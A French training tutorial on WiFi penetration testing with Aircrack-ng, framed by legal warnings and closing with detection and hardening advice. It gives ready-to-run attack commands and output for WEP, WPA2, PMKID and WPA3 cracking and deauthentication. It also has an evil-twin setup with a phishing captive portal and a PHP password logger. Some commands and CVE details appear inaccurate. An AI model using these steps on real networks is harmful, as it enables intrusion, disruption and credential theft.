# Aircrack-ng - Hacking WiFi Professionnel

## 📡 Vue d'ensemble

**Aircrack-ng** est LA suite d'outils de référence pour l'audit de sécurité des réseaux WiFi. Elle permet de tester la robustesse de TOUS les types de chiffrement WiFi (WEP, WPA, WPA2, WPA3) et d'identifier les vulnérabilités.

> **💡 Analogie Simple** : Aircrack-ng c'est comme un trousseau de clés de serrurier spécialisé dans les serrures sans fil - chaque outil a un usage spécifique pour "crocheter" différents types de protections WiFi.

## ⚠️ **IMPORTANT - Cadre Légal STRICT**

> **🎯 LE HACKING WIFI NON AUTORISÉ = CYBERCRIMINALITÉ !**

### 📝 Usage Autorisé vs INTERDIT :

**✅ STRICTEMENT AUTORISÉ :**
```
• Tests sur VOS PROPRES réseaux WiFi
• Réseaux d'entreprise avec autorisation ÉCRITE
• Laboratoires dédiés et isolés
• Formations et certifications officielles
• Pentest avec contrat signé
• Recherche académique autorisée
```

**❌ STRICTEMENT INTERDIT (= PRISON) :**
```
• Hack de réseaux WiFi voisins/publics
• Accès non autorisé à Internet via WiFi
• Écoute de trafic réseau tiers
• Vol d'identifiants WiFi
• Utilisation malveillante des données
• Tests sans autorisation explicite
```

**⚖️ RAPPEL LÉGAL :**
```
Code Pénal Français Article 323-1 :
"L'accès frauduleux à un système automatisé"
SANCTIONS : 3 ans de prison + 100 000€ d'amende

Article 323-2 : "Entrave au fonctionnement"  
SANCTIONS : 5 ans de prison + 150 000€ d'amende
```

## 🎯 Objectifs d'apprentissage

Après cette section, vous saurez :
1. **Installation et configuration** - Setup Aircrack-ng et cartes WiFi
2. **Modes monitor et injection** - Comprendre la capture sans fil
3. **Attaques WEP/WPA/WPA2** - Techniques de cracking complètes
4. **Evil Twin et point d'accès** - Créer faux hotspots
5. **Déauthentification et PMKID** - Attaques modernes

## 🛠️ Installation et Configuration

### **Installation sur Kali Linux**
```bash
# Aircrack-ng est pré-installé sur Kali
# Vérification version
aircrack-ng --help
airodump-ng --help
aireplay-ng --help

# Si pas installé ou mise à jour nécessaire :
sudo apt update
sudo apt install aircrack-ng

# Outils additionnels recommandés
sudo apt install reaver pixiewps hostapd dnsmasq
```

### **Cartes WiFi compatibles**

#### **Cartes WiFi recommandées pour pentest**
```bash
# CARTES WIFI AVEC INJECTION CONFIRMÉE :

🏆 EXCELLENT (injection + monitor mode) :
• Alfa AWUS036ACS (dual band 802.11ac)
• Alfa AWUS036NHA (2.4GHz, très populaire) 
• Panda PAU09 (2.4GHz, budget)
• TP-Link AC600 T2U Plus (dual band)

✅ BON (injection limitée) :
• Alfa AWUS036H (ancien mais robuste)
• Realtek 8188EU based adapters

❌ À ÉVITER (pas d'injection) :
• La plupart des cartes intégrées laptops
• Broadcom BCM43xx series
• Cartes "N-only" sans mode monitor

# VÉRIFIER COMPATIBILITÉ :
lsusb
# Rechercher chipset dans bases compatibilité
# https://wireless.wiki.kernel.org/en/users/drivers
```

#### **Installation drivers si nécessaire**
```bash
# Pour cartes Realtek (exemple)
sudo apt install realtek-rtl88xxau-dkms

# Pour cartes Atheros
sudo apt install firmware-atheros

# Recompiler drivers depuis source (Alfa AWUS036ACS)
git clone https://github.com/aircrack-ng/rtl8812au.git
cd rtl8812au
make && sudo make install

# Redémarrer ou recharger module
sudo modprobe -r 8812au && sudo modprobe 8812au
```

### **Configuration interface WiFi**

#### **Identifier les interfaces WiFi**
```bash
# Lister toutes interfaces réseau
ip link show

# Ou plus spécifique WiFi
iwconfig

# Résultat typique :
wlan0     IEEE 802.11  ESSID:off/any  
          Mode:Managed  Access Point: Not-Associated   
          Tx-Power=20 dBm   
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Power Management:off

# wlan0 = interface WiFi interne
# wlan1 = interface WiFi USB (si connectée)
```

#### **Passer en mode monitor**
```bash
# ÉTAPE 1 : Tuer processus qui peuvent interférer
sudo airmon-ng check kill

# PROCESSUS TYPIQUEMENT TUÉS :
# NetworkManager, wpa_supplicant, dhclient

# ÉTAPE 2 : Activer mode monitor  
sudo airmon-ng start wlan1

# SORTIE ATTENDUE :
PHY     Interface       Driver          Chipset
phy1    wlan1           88XXau          Realtek Semiconductor Corp. RTL8812AU
                (mac80211 monitor mode vif enabled on [phy1]wlan1mon)

# INTERFACE MONITOR CRÉÉE : wlan1mon

# ÉTAPE 3 : Vérifier mode monitor actif
iwconfig wlan1mon

# RÉSULTAT :
wlan1mon  IEEE 802.11  Mode:Monitor  Frequency:2.457 GHz  
          Tx-Power=20 dBm   
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Power Management:off
```

## 🔍 Reconnaissance WiFi

### **Découverte des réseaux disponibles**

#### **Scan basique avec airodump-ng**
```bash
# Scanner TOUS les réseaux à portée
sudo airodump-ng wlan1mon

# EXPLICATION DE L'AFFICHAGE :
CH  6 ][ Elapsed: 1 min ][ 2024-01-20 14:30

 BSSID              PWR  Beacons    #Data, #/s  CH   MB   CC  ESSID

 AA:BB:CC:DD:EE:FF  -30       156      47    2   6   54e  WPA2 MonReseauTest
 11:22:33:44:55:66  -45        89       0    0  11  130   WPA2 BBOX-12345678  
 77:88:99:AA:BB:CC  -52        45       12   1   1   54e  WEP  AncienRouteur
 DD:EE:FF:00:11:22  -65        23       0    0   6   54   WPA2 FreeWifi

# EXPLICATION COLONNES :
BSSID = Adresse MAC unique du point d'accès
PWR = Puissance signal (-30 = très proche, -90 = très loin)
Beacons = Paquets de balise envoyés par l'AP
#Data = Nombre paquets de données capturés
CH = Canal WiFi (1-14 en 2.4GHz, 36+ en 5GHz)
MB = Débit maximum supporté  
CC = Chiffrement (WEP, WPA, WPA2, OPN=ouvert)
ESSID = Nom du réseau visible
```

#### **Scanner canal spécifique**
```bash
# Se concentrer sur un canal précis (plus stable)
sudo airodump-ng -c 6 wlan1mon

# Scanner plage de canaux
sudo airodump-ng -c 1-11 wlan1mon

# Scanner uniquement 5GHz
sudo airodump-ng --band a wlan1mon

# Sauvegarder scan dans fichier
sudo airodump-ng -w scan_results wlan1mon
# Crée : scan_results-01.cap, scan_results-01.csv, scan_results-01.kismet.csv
```

### **Capture ciblée d'un réseau**

#### **Capturer trafic réseau spécifique**
```bash
# Cibler un BSSID précis pour capture
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture_target wlan1mon

# EXPLICATION PARAMÈTRES :
# -c 6 = Se limiter au canal 6 (évite saut de canaux)
# --bssid = Adresse MAC du point d'accès ciblé  
# -w capture_target = Nom fichier sauvegarde
# wlan1mon = Interface en mode monitor

# AFFICHAGE DÉTAILLÉ :
CH  6 ][ Elapsed: 5 mins ][ 2024-01-20 14:35

 BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   CC  ESSID
 AA:BB:CC:DD:EE:FF  -28  75      856      234   12   6   54e  WPA2 MonReseauTest

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes
 AA:BB:CC:DD:EE:FF  11:22:33:44:55:66  -42    0e- 1e     0      167  
 AA:BB:CC:DD:EE:FF  77:88:99:AA:BB:CC  -55    0e- 0e     0       89

# STATION = Appareils connectés au réseau (smartphones, PC, etc.)
# Frames = Nombre paquets échangés par cet appareil
```

## 🔓 Attaques WEP (Wired Equivalent Privacy)

### **Principe vulnérabilité WEP**
```bash
# WEP = TRÈS ANCIEN chiffrement (1997)
# COMPLÈTEMENT CASSÉ depuis 2001

POURQUOI WEP EST VULNÉRABLE :
1. Clé de chiffrement faible (40-bit ou 104-bit)
2. Vecteur d'initialisation (IV) répété  
3. Même clé utilisée pour tous clients
4. Algorithme RC4 mal implémenté

TEMPS POUR CASSER WEP :
• Réseau actif (trafic) : 5-15 minutes
• Réseau inactif : 2-6 heures (avec injection)
• Réseau abandonné : Impossible (pas de trafic)

PAQUETS NÉCESSAIRES :
• WEP 64-bit : ~20 000 paquets IV uniques
• WEP 128-bit : ~40 000 paquets IV uniques
```

### **Attaque WEP passive**
```bash
# ÉTAPE 1 : Capturer trafic WEP
sudo airodump-ng -c 6 --bssid 77:88:99:AA:BB:CC -w wep_capture wlan1mon

# Attendre accumulation paquets (colonne #Data)
# Objectif : 20 000+ paquets pour WEP 64-bit

# ÉTAPE 2 : Tenter crack avec paquets capturés
aircrack-ng wep_capture-01.cap

# SORTIE SUCCÈS :
                             [00:01:45] Tested 156742 keys (got 24953 IVs)

   KB    depth   byte(vote)
    0    0/  9   12(29952) A4(29184) 3F(28928) C6(28672) 6E(28416)
    1    0/  7   34(30464) F1(30208) 51(29696) C7(29440) 22(29184)
    2    0/  8   56(30720) AB(30464) 78(30208) 9C(29952) D3(29696)
    3    0/  6   78(31232) EF(30976) 9A(30720) BC(30464) 12(30208)
    4    0/  4   9A(31488) DE(31232) F0(30976) 23(30720) 45(30464)

                         KEY FOUND! [ 12:34:56:78:9A ]
        
# CLÉ WEP TROUVÉE : 12:34:56:78:9A
# Se connecter : sudo iwconfig wlan1 key 12:34:56:78:9A
```

### **Attaque WEP avec injection**
```bash
# Si peu de trafic naturel, forcer génération paquets

# ÉTAPE 1 : Test injection possible
sudo aireplay-ng -9 -e "AncienRouteur" -a 77:88:99:AA:BB:CC wlan1mon

# SORTIE TEST INJECTION :
14:35:12  Waiting for beacon frame (BSSID: 77:88:99:AA:BB:CC) on channel 6
14:35:12  Trying broadcast probe requests...
14:35:13  Injection is working!
14:35:13  Found 1 AP

# ÉTAPE 2 : Association fake (authentification ouverte WEP)
sudo aireplay-ng -1 0 -e "AncienRouteur" -a 77:88:99:AA:BB:CC -h 00:11:22:33:44:55 wlan1mon

# PARAMÈTRES :
# -1 0 = Fake authentication, 0 = délai re-association
# -e = Nom réseau (ESSID)
# -a = BSSID (adresse MAC point accès)  
# -h = Adresse MAC spoofée (notre carte)

# ÉTAPE 3 : Injection ARP replay (génère beaucoup trafic)
sudo aireplay-ng -3 -b 77:88:99:AA:BB:CC -h 00:11:22:33:44:55 wlan1mon

# PENDANT l'injection, dans autre terminal :
sudo airodump-ng -c 6 --bssid 77:88:99:AA:BB:CC -w wep_inject wlan1mon

# Observer colonne #Data augmenter rapidement : 100, 500, 1000, 5000...

# ÉTAPE 4 : Crack quand suffisamment paquets
aircrack-ng wep_inject-01.cap
```

## 🔐 Attaques WPA/WPA2 Personal (PSK)

### **Principe vulnérabilité WPA2-PSK**
```bash
# WPA2-PSK = WiFi Protected Access 2 - Pre-Shared Key

SÉCURITÉ WPA2 :
✅ Chiffrement fort (AES-CCMP)
✅ Clés temporelles (changent régulièrement)  
✅ Pas de IV réutilisés comme WEP

FAIBLESSE WPA2 :
❌ 4-way handshake capturables
❌ Attaque dictionnaire possible
❌ Mots de passe faibles vulnérables

MÉTHODE ATTAQUE :
1. Capturer 4-way handshake complet
2. Bruteforce offline avec dictionnaires
3. Si mot de passe simple → compromis
```

### **Capture du handshake WPA2**

#### **Méthode passive (attendre connexion)**
```bash
# ÉTAPE 1 : Capturer trafic réseau cible
sudo airodump-ng -c 11 --bssid 11:22:33:44:55:66 -w handshake_capture wlan1mon

# ATTENDRE qu'un appareil se connecte naturellement
# Visible dans STATION quand nouvelle connexion

# ÉTAPE 2 : Vérifier handshake capturé
aircrack-ng handshake_capture-01.cap

# SORTIE SI HANDSHAKE COMPLET :
Reading packets, please wait...
Opening handshake_capture-01.cap
Read 15642 packets.

#  BSSID              ESSID                     Encryption

1  11:22:33:44:55:66  BBOX-12345678            WPA (1 handshake)

# "1 handshake" = SUCCÈS ! Handshake complet capturé
```

#### **Méthode active (déauthentification)**
```bash
# Forcer déconnexion appareil pour provoquer reconnexion

# ÉTAPE 1 : Identifier client connecté
sudo airodump-ng -c 11 --bssid 11:22:33:44:55:66 wlan1mon

# Noter adresse MAC dans colonne STATION : 99:AA:BB:CC:DD:EE

# ÉTAPE 2 : Commencer capture handshake
sudo airodump-ng -c 11 --bssid 11:22:33:44:55:66 -w forced_handshake wlan1mon

# ÉTAPE 3 : Dans autre terminal, déauthentifier client
sudo aireplay-ng -0 5 -a 11:22:33:44:55:66 -c 99:AA:BB:CC:DD:EE wlan1mon

# PARAMÈTRES DÉAUTH :
# -0 5 = Envoi 5 paquets déauthentification
# -a = BSSID point d'accès
# -c = Adresse MAC client à déconnecter
# Si pas -c = déconnecte TOUS les clients

# DANS AIRODUMP, voir message : "WPA handshake: 11:22:33:44:55:66"
```

### **Cracking du handshake**

#### **Attaque dictionnaire classique**
```bash
# Utiliser wordlist pour tester mots de passe

# WORDLISTS COMMUNES :
# /usr/share/wordlists/rockyou.txt (14M mots de passe)
# /usr/share/wordlists/dirb/others/best110.txt (110 passwords communs)

# CRACK AVEC ROCKYOU :
aircrack-ng -w /usr/share/wordlists/rockyou.txt handshake_capture-01.cap

# AFFICHAGE PENDANT CRACK :
[00:01:32] 127843/14344391 keys tested (1432.73 k/s) 

Time left: 2 hours, 45 minutes                           0.89%

                           KEY FOUND! [ password123 ]

Master Key     : CD 4F 8B 3A 51 75 C9 E8 47 F4 D3 B1 1C C7 29 A5 
                 41 96 7C 8F 9D B5 E2 7A F9 8C 63 B4 85 12 F7 E3 

Transient Key  : AA 5E 7B 2F 85 91 D6 C4 1F B8 7E A9 33 D2 48 F1 
                 73 C8 95 A7 E4 6F B9 82 5A D1 C7 94 6E 38 B5 F2 

EAPOL HMAC     : 8D F5 A1 B3 C7 E9 4A 76 2F D8 E1 59 C4 B7 A3 E6

# MOT DE PASSE TROUVÉ : password123
```

#### **Création wordlist personnalisée**
```bash
# Générer wordlist ciblée avec crunch
crunch 8 12 abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 -t @@@@2024 -o wordlist_2024.txt

# PARAMÈTRES CRUNCH :
# 8 12 = longueur min-max password
# abcd... = charset utilisé  
# -t @@@@2024 = pattern (@@@@=4 chars aléatoires + "2024")
# -o = fichier sortie

# Exemples mots de passe générés :
abcd2024, Test2024, wifi2024, pass2024...

# Wordlist ESSID-based (nom réseau)
echo "BBOX-12345678" | sed 's/BBOX-//' > temp.txt
echo "bbox12345678" >> temp.txt  
echo "12345678" >> temp.txt
echo "Bbox12345678" >> temp.txt

# Crack avec wordlist personnalisée
aircrack-ng -w wordlist_custom.txt handshake_capture-01.cap
```

#### **Attaque avec règles John the Ripper**
```bash
# Convertir handshake pour John the Ripper
hccap2john handshake_capture-01.cap > hash_john.txt

# Crack avec règles de mutation
john --wordlist=/usr/share/wordlists/rockyou.txt --rules=best64 hash_john.txt

# RÈGLES BEST64 appliquent mutations :
# password → Password, password1, password!, drowssap, etc.

# Voir résultat  
john --show hash_john.txt
```

## 🎭 Attaques PMKID (WPA2 sans handshake)

### **Principe attaque PMKID**
```bash
# PMKID = Pairwise Master Key Identifier  
# Vulnérabilité découverte en 2018 par Jens Steube (hashcat)

AVANTAGE PMKID :
✅ Pas besoin d'attendre handshake client
✅ Une seule requête au point d'accès
✅ Plus discret que déauthentification
✅ Fonctionne même sans clients connectés

LIMITATION :
❌ Tous routeurs ne supportent pas
❌ Certains ont patché la vulnérabilité
❌ Toujours bruteforce dictionnaire après
```

### **Capture PMKID avec hcxdumptool**
```bash
# Installation hcxtools
sudo apt install hcxtools

# Capture PMKID
sudo hcxdumptool -i wlan1mon -o pmkid_capture.pcapng --enable_status=1

# SORTIE PENDANT CAPTURE :
INTERFACE.......: wlan1mon
MAC CLIENT......: a0:b1:c2:d3:e4:f5
MAC AP..........: 11:22:33:44:55:66
PMKID...........: 2582a8281bf9d96e5b5ad23b4a5e7a4e
ESSID...........: BBOX-12345678

# PMKID capturé ! Arrêter avec Ctrl+C

# Convertir au format hashcat
hcxpcapngtool -o pmkid_hashes.txt pmkid_capture.pcapng

# Fichier pmkid_hashes.txt contient :
2582a8281bf9d96e5b5ad23b4a5e7a4e*112233445566*a0b1c2d3e4f5*424248532d3132333435363738
```

### **Cracking PMKID avec hashcat**
```bash
# Crack PMKID avec hashcat (plus rapide qu'aircrack)
hashcat -m 16800 pmkid_hashes.txt /usr/share/wordlists/rockyou.txt

# PARAMÈTRES :
# -m 16800 = Mode PMKID WPA/WPA2
# pmkid_hashes.txt = Hash capturé
# rockyou.txt = Dictionnaire

# SORTIE SUCCÈS :
2582a8281bf9d96e5b5ad23b4a5e7a4e*112233445566*a0b1c2d3e4f5*424248532d3132333435363738:password123

Session..........: hashcat
Status...........: Cracked
Hash.Name........: WPA-PMKID-PBKDF2
Hash.Target......: 2582a8281bf9d96e5b5ad23b4a5e7a4e*112233445566*a0b1c2...3435363738
Time.Started.....: Sat Jan 20 14:45:12 2024 (1 min, 23 secs)
Time.Estimated...: Sat Jan 20 14:46:35 2024 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Speed.#1.........:    4567 H/s (8.92ms) @ Accel:64 Loops:256 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests

# PASSWORD TROUVÉ : password123
```

## 🕸️ Evil Twin et Rogue Access Points

### **Principe Evil Twin**
```bash
# EVIL TWIN = Faux point d'accès avec même nom que légitime

OBJECTIFS EVIL TWIN :
1. Voler credentials WiFi (phishing captive portal)
2. Intercepter trafic utilisateurs (MITM)
3. Servir malware via pages web
4. Collecter informations personnelles

TECHNIQUE :
1. Créer AP avec ESSID identique au légal
2. Puissance signal plus forte
3. Utilisateurs se connectent au faux
4. Captive portal demande "re-connexion"
5. Vol credentials + navigation piégée
```

### **Création Evil Twin avec hostapd**

#### **Configuration hostapd**
```bash
# ÉTAPE 1 : Créer fichier configuration
sudo nano /etc/hostapd/evil_twin.conf

# CONTENU FICHIER :
interface=wlan1
driver=nl80211
ssid=FreeWifi_Secure
hw_mode=g
channel=6
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
wpa=2
wpa_passphrase=MotDePasseFaux123
wpa_key_mgmt=WPA-PSK
wpa_pairwise=TKIP
rsn_pairwise=CCMP

# EXPLICATION CONFIG :
# ssid = Nom réseau (copier réseau légitime)
# channel = Canal (idéal = même que légitime)
# wpa_passphrase = Mot de passe bidon
# driver=nl80211 = Driver WiFi moderne
```

#### **Configuration DHCP avec dnsmasq**
```bash
# ÉTAPE 2 : Configurer serveur DHCP/DNS
sudo nano /etc/dnsmasq_evil.conf

# CONTENU :
interface=wlan1
dhcp-range=192.168.1.100,192.168.1.200,255.255.255.0,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
server=8.8.8.8
log-queries
log-dhcp
address=/#/192.168.1.1

# EXPLICATION :
# dhcp-range = IPs attribuées aux clients
# dhcp-option=3 = Gateway (notre machine)
# dhcp-option=6 = DNS server (notre machine)  
# address=/#/192.168.1.1 = Tout DNS → notre IP
```

#### **Lancement Evil Twin**
```bash
# ÉTAPE 3 : Configuration interface
sudo ifconfig wlan1 192.168.1.1 netmask 255.255.255.0

# ÉTAPE 4 : Routage IP (partage connexion)
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
sudo iptables -A FORWARD -i wlan1 -o eth0 -j ACCEPT
sudo echo 1 > /proc/sys/net/ipv4/ip_forward

# ÉTAPE 5 : Démarrer services
sudo hostapd /etc/hostapd/evil_twin.conf &
sudo dnsmasq -C /etc/dnsmasq_evil.conf -d &

# ÉTAPE 6 : Vérifier AP actif
iwconfig wlan1
# Mode:Master = Point d'accès actif
```

### **Captive portal phishing**

#### **Serveur web Apache simple**
```bash
# ÉTAPE 1 : Installer Apache
sudo apt install apache2 php

# ÉTAPE 2 : Créer page phishing WiFi
sudo nano /var/www/html/index.html

# CONTENU PAGE PHISHING :
<!DOCTYPE html>
<html>
<head>
    <title>Connexion WiFi Sécurisée</title>
    <style>
        body { font-family: Arial; background: #f0f0f0; }
        .login-box { 
            width: 400px; margin: 100px auto; 
            background: white; padding: 30px; 
            border-radius: 10px; box-shadow: 0 0 20px rgba(0,0,0,0.1);
        }
        input[type="password"] { 
            width: 100%; padding: 10px; margin: 10px 0; 
            border: 1px solid #ddd; border-radius: 5px;
        }
        .btn { 
            background: #007cba; color: white; 
            padding: 12px 30px; border: none; 
            border-radius: 5px; cursor: pointer;
        }
    </style>
</head>
<body>
    <div class="login-box">
        <h2>🔒 Sécurité WiFi</h2>
        <p>Pour des raisons de sécurité, veuillez confirmer le mot de passe WiFi :</p>
        
        <form action="capture.php" method="POST">
            <label>Réseau : <strong>FreeWifi_Secure</strong></label><br>
            <input type="password" name="wifi_password" placeholder="Mot de passe WiFi" required>
            <br><br>
            <button type="submit" class="btn">Se connecter</button>
        </form>
        
        <p style="font-size: 12px; color: #666;">
        Connexion sécurisée par protocole WPA2-Enterprise
        </p>
    </div>
</body>
</html>
```

#### **Script capture credentials**
```bash
# ÉTAPE 3 : Script PHP capture mots de passe
sudo nano /var/www/html/capture.php

# CONTENU SCRIPT :
<?php
$password = $_POST['wifi_password'];
$ip = $_SERVER['REMOTE_ADDR'];
$user_agent = $_SERVER['HTTP_USER_AGENT'];
$timestamp = date('Y-m-d H:i:s');

// Sauvegarder credential
$log = "[$timestamp] IP: $ip | Password: $password | UA: $user_agent\n";
file_put_contents('/tmp/evil_twin_capture.log', $log, FILE_APPEND);

// Rediriger vers vrai site
header('Location: https://www.google.com');
exit();
?>

# ÉTAPE 4 : Démarrer serveur web
sudo systemctl start apache2

# ÉTAPE 5 : Redirection tout trafic web vers captive portal
sudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 192.168.1.1:80
sudo iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT --to-destination 192.168.1.1:80
```

## 🔒 Attaques WPA3

### **Vulnérabilités WPA3 connues**

#### **Dragonfly handshake attacks**
```bash
# WPA3 utilise SAE (Simultaneous Authentication of Equals)
# Vulnérabilités découvertes en 2019 (Dragonblood)

VULNÉRABILITÉS WPA3 :
• CVE-2019-13456 : Information leak via timing
• CVE-2019-13377 : Cache-based side channel  
• CVE-2019-13466 : Dictionary attack possible

OUTILS POUR WPA3 :
• dragonforce (attaque dictionnaire SAE)
• dragondrain (DoS WPA3 handshake)
• dragontime (timing attack)
```

#### **Attaque WPA3 avec dragonforce**
```bash
# Installation outils WPA3
git clone https://github.com/vanhoefm/dragondrain-and-time.git
cd dragondrain-and-time

# Compilation
make

# Capture handshake WPA3 (similaire WPA2)
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w wpa3_capture wlan1mon

# Attaque dictionnaire WPA3 SAE
./dragonforce wpa3_capture-01.cap /usr/share/wordlists/rockyou.txt

# PLUS LENT que WPA2 car SAE plus robuste
```

## 🛡️ Détection et Protection

### **Détection attaques WiFi**

#### **Monitoring avec Kismet**
```bash
# Installation Kismet (détecteur d'intrusion WiFi)
sudo apt install kismet

# Lancement Kismet
sudo kismet

# Interface web : http://localhost:2501

# DÉTECTIONS KISMET :
🚨 Rogue Access Points (Evil Twin)
🚨 Déauthentification attacks  
🚨 Injection attacks
🚨 Unusual probe requests
🚨 Handshake captures
🚨 WPS attacks
```

#### **Détection Evil Twin**
```bash
# Script détection Evil Twin
#!/bin/bash
# detect_evil_twin.sh

KNOWN_BSSID="11:22:33:44:55:66"  # BSSID légitime
KNOWN_ESSID="MonReseauLegal"

while true; do
    # Scanner réseaux avec même ESSID
    iwlist wlan0 scan | grep -A 5 -B 5 "$KNOWN_ESSID" | while read line; do
        if [[ $line == *"Address:"* ]]; then
            DETECTED_BSSID=$(echo $line | cut -d' ' -f5)
            if [[ "$DETECTED_BSSID" != "$KNOWN_BSSID" ]]; then
                echo "[ALERT] Evil Twin détecté !"
                echo "ESSID: $KNOWN_ESSID"
                echo "BSSID légitime: $KNOWN_BSSID"  
                echo "BSSID suspect: $DETECTED_BSSID"
                echo "Time: $(date)"
                echo "---"
            fi
        fi
    done
    sleep 30
done
```

### **Protections recommandées**

#### **Configuration sécurisée routeur WiFi**
```bash
# RECOMMANDATIONS SÉCURITÉ WIFI :

🔒 CHIFFREMENT :
✅ WPA3-Personal (ou minimum WPA2-Personal)  
❌ JAMAIS WEP ou Open
✅ AES-CCMP (pas TKIP)

🔑 MOT DE PASSE :
✅ 20+ caractères aléatoires
✅ Mélange majuscules/minuscules/chiffres/symboles
❌ Pas de mots dictionnaire
❌ Pas d'infos personnelles

📡 CONFIGURATION :
✅ Désactiver WPS (Pin et Push Button)
✅ Masquer SSID (security by obscurity limitée)
✅ Filtrage MAC (limitation pratique)
✅ Réduire puissance signal si possible

🔄 MONITORING :
✅ Logs d'authentification activés
✅ Alertes connexions inconnues
✅ Surveillance déconnexions fréquentes
✅ Audit régulier clients connectés

📋 RÉSEAU D'ENTREPRISE :
✅ WPA2/WPA3-Enterprise (802.1X)
✅ Serveur RADIUS dédié
✅ Certificats clients
✅ VLAN ségrégation
✅ NAC (Network Access Control)
```

## 📋 Checklist Audit WiFi

### **Préparation audit**
```bash
☐ Autorisation écrite obtenue pour tous réseaux
☐ Scope défini (quels réseaux, quelles techniques)
☐ Cartes WiFi compatibles testées
☐ Outils à jour (aircrack-ng, hashcat, etc.)
☐ Wordlists préparées et adaptées
☐ Environnement de test isolé
☐ Documentation template prête
☐ Planning défini (heures creuses si prod)
```

### **Tests techniques**
```bash
☐ Scan découverte tous réseaux à portée
☐ Identification chiffrements utilisés
☐ Test vulnérabilités WEP (si présent)
☐ Capture handshakes WPA/WPA2
☐ Test attaques PMKID
☐ Audit force mots de passe (dictionnaire)
☐ Test Evil Twin (si autorisé)
☐ Vérification WPS activé/vulnérable
☐ Test déauthentification DoS
☐ Analyse clients connectés
☐ Test déconnexions anormales
☐ Vérification isolation réseaux
```

### **Rapport et recommandations**
```bash
☐ Inventaire complet réseaux détectés
☐ Classification niveaux sécurité
☐ Mots de passe compromis listés
☐ Vulnérabilités techniques détaillées
☐ Preuves de concept (screenshots)
☐ Impact business évalué
☐ Recommandations priorisées
☐ Plan remediation avec délais
☐ Sensibilisation utilisateurs prévue
☐ Retests programmés
```

## 🎯 Ressources et Références

### **Documentation officielle**
- **Aircrack-ng** : https://www.aircrack-ng.org/documentation.html
- **Hashcat** : https://hashcat.net/wiki/
- **Hostapd** : https://w1.fi/hostapd/
- **IEEE 802.11** : https://standards.ieee.org/standard/802_11-2020.html

### **Bases de données vulnérabilités**
- **WPA/WPA2 Research** : https://papers.mathyvanhoef.com/
- **WiFi Security Research** : https://www.krackattacks.com/
- **Dragonblood WPA3** : https://wpa3.mathyvanhoef.com/

### **Wordlists et dictionnaires**
- **SecLists** : https://github.com/danielmiessler/SecLists/tree/master/Passwords/WiFi-WPA
- **WiFi passwords** : https://github.com/kennyn510/wpa2-wordlists
- **Crunch generator** : https://sourceforge.net/projects/crunch-wordlist/

---
*Le WiFi est omniprésent mais souvent mal sécurisé. Maîtriser son audit est essentiel pour tout expert en cybersécurité !* 